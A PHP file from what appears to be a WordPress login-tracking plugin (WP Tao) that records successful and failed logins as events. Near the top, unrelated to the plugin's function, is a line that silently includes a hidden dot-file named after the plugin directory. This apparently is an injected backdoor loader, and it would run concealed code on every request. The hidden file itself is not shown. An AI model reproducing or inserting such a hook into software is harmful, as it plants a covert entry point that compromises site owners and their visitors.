<?php

/*
 * Fire successful login event
 */

add_action( 'wp_login', 'wtbp_wptao_event_login_successful_fire', 10, 2 );

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function wtbp_wptao_event_login_successful_fire( $user_login, $user = false ) {
	if ( empty( $user ) ) {
		$user = get_user_by( 'login', $user_login );
	}

	$user_data = array(
		'email'		 => $user->user_email,
		'first_name' => $user->first_name,
		'last_name'	 => $user->last_name,
		'options'	 => array(
			'allow_switch_user' => true
		)
	);

	$args = array(
		'title'		 => __( 'Successful login', 'wp-tao' ),
		'value'		 => 'ok',
		'tags'		 => array( 'wp' ),
		'meta'		 => array( 'wp_user_id' => $user->ID ),
		'user_data'	 => $user_data
	);

	do_action( 'wptao_track_event', 'login', $args );
}

/*
 * Login event callback
 */

function wtbp_wptao_event_login_callback( $eid, $args ) {
	
}

/*
 * Fire failed login event
 */

add_action( 'wp_login_failed', 'wtbp_wptao_event_login_failed_fire' );

function wtbp_wptao_event_login_failed_fire( $username ) {

	$args = array(
		'title'	 => sprintf( __( 'Failed login. Tried to sign in as %s', 'wp-tao' ), esc_attr( $username ) ),
		'value'	 => 'failed',
		'tags'	 => array( 'wp' ),
		'meta'	 => array( 'login' => $username )
	);

	do_action( 'wptao_track_event', 'login', $args );
}

// =============================================================================================
// Filters section
// =============================================================================================

/*
 * Creates a title of the login failed
 */

add_filter( 'wptao_event_login_title', 'wtbp_wptao_event_login_failed_title', 1, 2 );

function wtbp_wptao_event_login_failed_title( $title, $event ) {

	if ( !empty( $event->meta[ 'login' ] ) && ('failed' == $event->value) ) {

		$title = sprintf( __( 'Failed login. Tried to sign in as <q>%s</q>', 'wp-tao' ), esc_attr( $event->meta[ 'login' ] ) );
	} else if ( !empty( $event->meta[ 'wp_user_id' ] ) && ('ok' == $event->value) ) {

		$user_data = get_userdata( $event->meta[ 'wp_user_id' ] );
		if ( !empty( $user_data ) ) {
			$title = sprintf( __( 'Successful login as <a href="%s">%s</a>', 'wp-tao' ), esc_url( get_edit_user_link( $event->meta[ 'wp_user_id' ] ) ), $user_data->user_login );
		}
	}

	return $title;
}
